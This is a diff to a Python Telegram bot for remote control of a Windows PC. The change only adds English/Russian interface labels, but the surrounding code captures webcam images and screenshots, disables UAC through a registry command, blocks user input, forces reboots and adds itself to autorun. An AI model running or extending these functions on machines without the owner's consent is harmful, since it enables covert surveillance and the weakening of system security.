@@ -53,6 +53,31 @@ users_ids = data["bot_users"]
 if write_logs:  
 	logging.basicConfig(level=logging.INFO, filename=file_logs,filemode=mode_logs, format=format_logs)
 
+# ---------------------------------
+language = "en"
+# ---------------------------------
+
+def init_language(language):
+    global success, need_to_reboot, camera, screenshot, keyboard, mouse
+    if language == "en":
+        success = "✅ Success!"
+        need_to_reboot = "✅ Need to reboot."
+        camera = "📸 Camera"
+        screenshot = "🖥 Screenshot"
+        keyboard = "⌨ Keyboard"
+        mouse = "🖱 Mouse"
+    elif language == "ru":
+        success = "✅ Успешно!"
+        need_to_reboot = "✅ Для применения нужна перезагрузка."
+        camera = "📸 Камера"
+        screenshot = "🖥 Скриншот"
+        keyboard = "⌨ Клавиатура"
+        mouse = "🖱 Мышь"
+
+        
+
+init_language("en")
+
 rlgs = " "
 sysmode = 0
 inputblocked = False
@@ -66,10 +91,10 @@ def start(message):
     if not message.from_user.id in users_ids:
         return None
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    item1 = types.KeyboardButton("📸 Camera")
-    item2 = types.KeyboardButton("🖥 Screenshot")
-    item3 = types.KeyboardButton("⌨ Keyboard")
-    item4 = types.KeyboardButton("🖱 Mouse")
+    item1 = types.KeyboardButton(camera)
+    item2 = types.KeyboardButton(screenshot)
+    item3 = types.KeyboardButton(keyboard)
+    item4 = types.KeyboardButton(mouse)
     item5 = types.KeyboardButton("📺 Information")
     item6 = types.KeyboardButton("🔧 Management")
     item7 = types.KeyboardButton("📜 Logs")
@@ -77,7 +102,7 @@ def start(message):
     
     markup.add(item1, item2, item3, item4, item5, item6, item7, item8)
     bot.send_message(message.chat.id, "📁 Select option:", reply_markup=markup)
-@bot.message_handler(func=lambda message: message.text == "📸 Camera")
+@bot.message_handler(func=lambda message: message.text == camera)
 def camera_shot(message):
     if not message.from_user.id in users_ids:
         return None
@@ -96,7 +121,7 @@ def camera_shot(message):
     bot.send_photo(message.chat.id, photo)
     photo.close()
 
-@bot.message_handler(func=lambda message: message.text == "🖥 Screenshot")
+@bot.message_handler(func=lambda message: message.text == screenshot)
 def tg_screenshot(message):
     if not message.from_user.id in users_ids:
         return None
@@ -110,7 +135,7 @@ def tg_screenshot(message):
     scre = open('screen.png', 'rb')
     bot.send_photo(message.chat.id, scre)
 
-@bot.message_handler(func=lambda message: message.text == "⌨ Keyboard")
+@bot.message_handler(func=lambda message: message.text == keyboard)
 def open_keyboard_menu(message):
     if not message.from_user.id in users_ids:
         return None
@@ -146,7 +171,7 @@ def disable_uac(message):
         return None
     global rlgs
     os.system(r"REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
-    bot.send_message(message.chat.id, f"✅ Need to reboot.")
+    bot.send_message(message.chat.id, need_to_reboot)
 
 @bot.message_handler(func=lambda message: message.text == "🔧 Reboot")
 def tg_reboot(message):
@@ -154,7 +179,7 @@ def tg_reboot(message):
         return None
     global rlgs
     os.system("shutdown /r /t 0")
-    bot.send_message(message.chat.id, f"✅ Success!")
+    bot.send_message(message.chat.id, success)
 
 @bot.message_handler(func=lambda message: message.text == "🔧 Shutdown")
 def tg_shutdown(message):
@@ -162,7 +187,7 @@ def tg_shutdown(message):
         return None
     global rlgs
     os.system("shutdown /s /t 0")
-    bot.send_message(message.chat.id, f"✅ Success!")
+    bot.send_message(message.chat.id, success)
 
 @bot.message_handler(func=lambda message: message.text == "🔧 Block input")
 def block_input(message):
@@ -173,11 +198,11 @@ def block_input(message):
     if inputblocked:
         inputblocked = False
         ok = windll.user32.BlockInput(False) #disable block 
-        bot.send_message(message.chat.id, f"✅ Success!")
+        bot.send_message(message.chat.id, success)
     else:
         inputblocked = True
         ok = windll.user32.BlockInput(True) #enable block
-        bot.send_message(message.chat.id, f"✅ Success!")
+        bot.send_message(message.chat.id, success)
 
 @bot.message_handler(func=lambda message: message.text == "🔧 Add in autorun")
 def add_autorun(message):
@@ -270,7 +295,7 @@ def keyboard_win_e(message):
     hotkey('win', 'e')
     bot.send_message(message.chat.id, "✅ Success!")
 
-@bot.message_handler(func=lambda message: message.text == "🖱 Mouse")
+@bot.message_handler(func=lambda message: message.text == mouse)
 def open_mouse_menu(message):
     if not message.from_user.id in users_ids:
         return None
